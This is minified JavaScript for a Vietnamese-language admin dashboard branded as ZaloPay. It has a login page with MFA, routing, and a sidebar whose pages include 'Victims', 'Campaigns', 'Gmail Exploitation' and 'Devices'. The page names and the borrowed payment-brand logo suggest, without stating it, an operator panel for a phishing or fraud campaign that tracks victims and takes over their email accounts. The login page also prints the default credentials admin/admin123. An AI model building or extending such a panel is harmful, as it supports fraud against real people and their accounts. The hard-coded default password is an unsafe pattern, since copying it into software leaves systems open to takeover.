text-gray-500"})]})}),e.jsxs(Bn,{align:"end",className:"w-56",children:[e.jsxs("div",{className:"px-3 py-2",children:[e.jsx("p",{className:"text-sm font-medium",children:(t==null?void 0:t.username)||"Admin"}),e.jsx("p",{className:"text-xs text-gray-500",children:t==null?void 0:t.email})]}),e.jsx(Is,{}),e.jsxs(qs,{onClick:r,children:[e.jsx(as,{className:"h-4 w-4 mr-2"}),"Cài đặt tài khoản"]}),e.jsx(Is,{}),e.jsxs(qs,{onClick:a,className:"text-red-600",children:[e.jsx(ua,{className:"h-4 w-4 mr-2"}),"Đăng xuất"]})]})]})]})]})}const Ii=[{name:"Tổng quan",href:"/",icon:xa},{name:"Victims",href:"/victims",icon:Ve},{name:"Campaigns",href:"/campaigns",icon:Nt},{name:"Gmail Exploitation",href:"/gmail",icon:Ke},{name:"Activity Logs",href:"/activity-logs",icon:Ue},{name:"Devices",href:"/devices",icon:Ct},{name:"Xác minh tài khoản",href:"/verifications",icon:Je},{name:"Quản lý đối tác",href:"/partners",icon:sn},{name:"Giao dịch",href:"/transactions",icon:dt},{name:"Báo cáo",href:"/reports",icon:We},{name:"Cài đặt",href:"/settings",icon:as}];function Bi({isOpen:n,onClose:t}){const[s,a]=Xe(),r=i=>{a(i),t()};return e.jsxs(e.Fragment,{children:[n&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 z-40 lg:hidden",onClick:t}),e.jsxs("div",{className:Z("fixed inset-y-0 left-0 z-50 w-64 bg-white border-r border-gray-200 transform transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0",n?"translate-x-0":"-translate-x-full"),children:[e.jsxs("div",{className:"flex h-16 items-center justify-between px-4 border-b border-gray-200",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx("img",{src:"https://stc-zaloprofile.zdn.vn/pc/v1/images/logo_zalopay.png",alt:"ZaloPay",className:"h-8"}),e.jsx("span",{className:"text-lg font-semibold text-gray-900",children:"Admin"})]}),e.jsx(C,{variant:"ghost",size:"icon",onClick:t,className:"lg:hidden text-gray-500 hover:text-gray-900",children:e.jsx(hn,{className:"h-5 w-5"})})]}),e.jsx("nav",{className:"flex-1 px-4 py-4 space-y-2",children:Ii.map(i=>{const c=s===i.href;return e.jsxs("button",{onClick:()=>r(i.href),className:Z("w-full flex items-center px-3 py-2 text-sm font-medium rounded-lg transition-colors",c?"bg-blue-50 text-blue-700 border-r-2 border-blue-700":"text-gray-700 hover:bg-gray-50 hover:text-gray-900"),children:[e.jsx(i.icon,{className:Z("mr-3 h-5 w-5",c?"text-blue-700":"text-gray-400")}),i.name]},i.name)})}),e.jsx("div",{className:"p-4 border-t border-gray-200",children:e.jsxs("div",{className:"text-xs text-gray-500 text-center",children:[e.jsx("p",{children:"ZaloPay Admin Portal"}),e.jsx("p",{children:"v1.0.0"})]})})]})]})}function Fi(){const n=()=>{window.location.href="/admin"},t=()=>{window.history.back()};return e.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-6",children:e.jsxs(k,{className:"w-full max-w-md",children:[e.jsxs(L,{className:"text-center",children:[e.jsx("div",{className:"mx-auto w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4",children:e.jsx("span",{className:"text-2xl font-bold text-red-600",children:"404"})}),e.jsx(M,{className:"text-xl text-gray-900",children:"Không tìm thấy trang"})]}),e.jsxs(_,{className:"text-center space-y-4",children:[e.jsx("p",{className:"text-gray-600",children:"Trang bạn đang tìm kiếm không tồn tại hoặc đã được di chuyển."}),e.jsxs("div",{className:"flex flex-col gap-3",children:[e.jsxs(C,{onClick:n,className:"w-full",children:[e.jsx(ma,{className:"h-4 w-4 mr-2"}),"Về trang chủ"]}),e.jsxs(C,{variant:"outline",onClick:t,className:"w-full",children:[e.jsx(ts,{className:"h-4 w-4 mr-2"}),"Quay lại"]})]})]})]})})}const Vi=()=>{const[n,t]=d.useState(""),[s,a]=d.useState(""),[r,i]=d.useState(""),[c,x]=d.useState(""),[l,y]=d.useState(!1),[f,b]=d.useState(""),[o,p]=d.useState(!1),[g,h]=d.useState(!1),[,m]=Xe(),B=async P=>{P.preventDefault(),y(!0),b("");try{if(o){const S=await fetch("/api/admin/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:n,password:s,mfa_code:g?null:r,backup_code:g?c:null})});if(!S.ok){const V=await S.json();throw new Error(V.error||"Mã xác thực không hợp lệ")}const O=await S.json();localStorage.setItem("zalopay_admin_token",O.token),localStorage.setItem("zalopay_admin_user",JSON.stringify(O.user)),m("/"),Es()}else{const S=await fetch("/api/admin/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:n,password:s})});if(!S.ok){const V=await S.json();if(V.requires_mfa){p(!0);return}throw new Error(V.error||"Tên đăng nhập hoặc mật khẩu không đúng")}const O=await S.json();localStorage.setItem("zalopay_admin_token",O.token),localStorage.setItem("zalopay_admin_user",JSON.stringify(O.user)),m("/"),Es()}}catch(S){b(S instanceof Error?S.message:"Lỗi đăng nhập. Vui lòng thử lại.")}finally{y(!1)}};return e.jsx("div",{className:"min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center",children:e.jsxs("div",{className:"bg-white p-8 rounded-lg shadow-lg w-full max-w-md",children:[e.jsxs("div",{className:"text-center mb-8",children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"ZaloPay Admin"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Đăng nhập để quản lý hệ thống"})]}),e.jsxs("form",{onSubmit:B,className:"space-y-6",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Tên đăng nhập"}),e.jsx("input",{type:"text",value:n,onChange:P=>t(P.target.value),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",required:!0,disabled:l})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mật khẩu"}),e.jsx("input",{type:"password",value:s,onChange:P=>a(P.target.value),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",required:!0,disabled:l})]}),o&&e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"bg-blue-50 border border-blue-200 rounded-md p-3",children:[e.jsx("p",{className:"text-blue-800 text-sm font-medium mb-1",children:"Xác thực hai yếu tố (MFA) được yêu cầu"}),e.jsx("p",{className:"text-blue-700 text-xs",children:"Nhập mã 6 chữ số từ ứng dụng xác thực của bạn"})]}),g?e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mã dự phòng"}),e.jsx(Ht,{value:c,onChange:x,length:8,disabled:l,error:f,placeholder:"Nhập mã dự phòng 8 ký tự"}),e.jsx("button",{type:"button",onClick:()=>{h(!1),x(""),b("")},className:"mt-2 text-sm text-blue-600 hover:text-blue-800",children:"Sử dụng mã xác thực"})]}):e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mã xác thực"}),e.jsx(Ht,{value:r,onChange:i,disabled:l,error:f}),e.jsx("button",{type:"button",onClick:()=>{h(!0),i(""),b("")},className:"mt-2 text-sm text-blue-600 hover:text-blue-800",children:"Sử dụng mã dự phòng"})]})]}),f&&e.jsx("div",{className:"bg-red-50 border border-red-200 rounded-md p-3",children:e.jsx("p",{className:"text-red-600 text-sm",children:f})}),e.jsx("button",{type:"submit",disabled:l||o&&!g&&r.length!==6||o&&g&&c.length!==8,className:"w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50",children:l?"Đang đăng nhập...":o?"Xác thực":"Đăng nhập"})]}),e.jsx("div",{className:"mt-6 text-center text-sm text-gray-500",children:e.jsx("p",{children:"Tài khoản mặc định: admin / admin123"})})]})})},zi=({children:n})=>{const[t,s]=d.useState(!1);return e.jsxs("div",{className:"min-h-screen bg-gray-50",children:[e.jsx(qi,{onMenuClick:()=>s(!t)}),e.jsxs("div",{className:"flex",children:[e.jsx(Bi,{isOpen:t,onClose:()=>s(!1)}),e.jsx("main",{className:"flex-1 lg:ml-64",children:n})]})]})},fe=({children:n})=>{const[t,s]=d.useState(null),[,a]=Xe();return d.useEffect(()=>{(async()=>{const i=await Q.isAuthenticated();s(i),i||a("/login")})()},[a]),t===null?e.jsx("div",{className:"min-h-screen flex items-center justify-center",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):t?e.jsx(zi,{children:n}):null},Ui=new sa({defaultOptions:{queries:{retry:1,refetchOnWindowFocus:!1}}}),$i=()=>e.jsxs(na,{client:Ui,children:[e.jsx(ea,{base:"/admin",children:e.jsxs(ta,{children:[e.jsx(xe,{path:"/login",component:Vi}),e.jsx(xe,{path:"/",children:e.jsx(fe,{children:e.jsx(mi,{})})}),e.jsx(xe,{path:"/victims",children:e.jsx(fe,{children:e.jsx(Ds,{})})}),e.jsx(xe,{path:"/registrations",children:e.jsx(fe,{children:e.jsx(Ds,{})})}),e.jsx(xe,{path:"/campaigns",children:e.jsx(fe,{children:e.jsx(ji,{})})}),e.jsx(xe,{path:"/gmail",children:e.jsx(fe,{children:e.jsx(yi,{})})}),e.jsx(xe,{path:"/activity-logs",children:e.jsx(fe,{children:e.jsx(vi,{})})}),e.jsx(xe,{path:"/devices",children:e.jsx(fe,{children:e.jsx(Ri,{})})}),e.jsx(xe,{path:"/devices/:id",children:e.jsx(fe,{children:e.jsx(Pi,{})})}),e.jsx(xe,{path:"/transactions",children:e.jsx(fe,{children:e.jsx(bi,{})})}),e.jsx(xe,{path:"/verifications",children:e.jsx(fe,{children:e.jsx(Ni,{})})}),e.jsx(xe,{path:"/partners",children:e.jsx(fe,{children:e.jsx(wi,{})})}),e.jsx(xe,{path:"/partners/:id",children:e.jsx(fe,{children:e.jsx(ki,{})})}),e.jsx(xe,{path:"/reports",children:e.jsx(fe,{children:e.jsx(_i,{})})}),e.jsx(xe,{path:"/settings",children:e.jsx(fe,{children:e.jsx(Si,{})})}),e.jsx(xe,{path:"/mfa-setup",children:e.jsx(fe,{children:e.jsx(Ci,{})})}),e.jsx(xe,{children:e.jsx(Fi,{})})]})}),e.jsx(dr,{})]});function Hi(){"serviceWorker"in navigator&&(window.addEventListener("load",()=>{navigator.serviceWorker.register("/admin/sw.js").then(n=>{console.log("Service Worker registered:",n.scope),n.addEventListener("updatefound",()=>{const t=n.installing;t&&t.addEventListener("statechange",()=>{t.state==="installed"&&navigator.serviceWorker.controller&&confirm("New version available. Reload to update?")&&window.location.reload()})})}).catch(n=>{console.error("Service Worker registration failed:",n)})}),navigator.serviceWorker.addEventListener("message",n=>{console.log("Message from service worker:",n.data)}))}window.addEventListener("beforeinstallprompt",n=>{n.preventDefault()});Hi();Ys(document.getElementById("root")).render(e.jsx($i,{}));
